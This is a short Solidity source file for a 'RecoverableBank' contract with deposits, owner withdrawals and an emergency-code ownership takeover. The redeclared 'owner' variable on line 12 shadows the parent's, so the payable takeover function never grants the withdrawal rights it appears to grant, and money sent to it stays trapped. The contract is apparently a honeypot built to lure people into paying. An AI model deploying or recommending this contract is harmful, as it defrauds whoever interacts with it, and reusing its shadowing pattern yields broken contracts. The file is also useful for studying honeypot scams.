1 pragma solidity ^0.4.18;
2 
3 contract Owned {
4     address public owner;
5     function Owned() { owner = msg.sender; }
6     modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
7 }
8 
9 contract RecoverableBank is Owned {
10     event BankDeposit(address from, uint amount);
11     event BankWithdrawal(address from, uint amount);
12     address public owner = msg.sender;
13     uint256 ecode;
14     uint256 evalue;
15 
16     function() public payable {
17         deposit();
18     }
19 
20     function deposit() public payable {
21         require(msg.value > 0);
22         BankDeposit(msg.sender, msg.value);
23     }
24 
25     function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {
26         ecode = code;
27         evalue = value;
28     }
29 
30     function useEmergencyCode(uint256 code) public payable {
31         if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;
32     }
33 
34     function withdraw(uint amount) public onlyOwner {
35         require(amount <= this.balance);
36         msg.sender.transfer(amount);
37     }
38 }